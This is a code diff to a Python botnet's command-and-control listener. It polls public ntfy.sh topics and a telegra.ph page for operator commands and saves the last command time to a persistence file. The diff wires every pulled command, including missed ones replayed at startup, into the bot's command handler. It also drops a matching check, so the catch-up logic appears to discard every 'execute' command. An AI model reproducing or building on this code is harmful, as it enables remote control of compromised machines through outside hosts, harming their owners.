@@ -7,9 +7,10 @@ from datetime import date
 
 # Returns commands from C2 server
 class C2Listener:
-    def __init__(self, crypt: Cryptographic):
+    def __init__(self, bot, crypt: Cryptographic):
         self.C2_telegraph_URL = "https://telegra.ph/BNS-TESTING-03-10"
         self.parser = Parser.Parser(crypt)
+        self.bot = bot
 
         self.C2_ntfy_URL = "https://ntfy.sh/BNS_BN_22_Admin/json"
         self.C2_ntfy_all_URL = "https://ntfy.sh/BNS_BN_22_Admin/json?poll=1"
@@ -29,7 +30,7 @@ class C2Listener:
         
     # start listening to the commands of the admin
     def start_command_listener(self):
-        self.startup_check_old()
+        self.__startup_check_old()
 
         r = requests.get(url=self.C2_ntfy_URL, stream=True)
 
@@ -37,21 +38,21 @@ class C2Listener:
             print(f"Bot failed to pull commands.")
             return "None"
         
+        # check all new messages
         for line in r.iter_lines():
             data = json.loads(line)
 
             if (data["event"] == "message"):
                 command = self.parser.parse_command(data["message"])
-                print(f"Bot pulled commands: {command}")
 
                 self.last_command_time = data["time"]
                 with open("Botnet_precistantData.txt", "w") as f:
                     f.write("Last time: " + str(self.last_command_time) +"\n")
-
-                    # do something with command
+                
+                self.bot.handle_command(command)
 
     # check on startup if there are any past commands you missed
-    def startup_check_old(self):
+    def __startup_check_old(self):
         # get old messages
         r = requests.get(url=self.C2_ntfy_all_URL, stream=True)
 
@@ -95,8 +96,6 @@ class C2Listener:
                     i = 0
                     while i < len(commandsToExecute):
                         if commandsToExecute[i][0] == "execute":
-                            print("match: " + commandsToExecute[i][1] + " = " + command[1])
-                        if commandsToExecute[i][0] == "execute" and commandsToExecute[i][1] == command[1]:
                             commandsToExecute.pop(i)
                         else:
                             i += 1
@@ -105,6 +104,6 @@ class C2Listener:
             
         # execute all remaining commands
         for command in commandsToExecute:
-            print(f"Catchup command: {command}")
+            self.bot.handle_command(command)
         
 
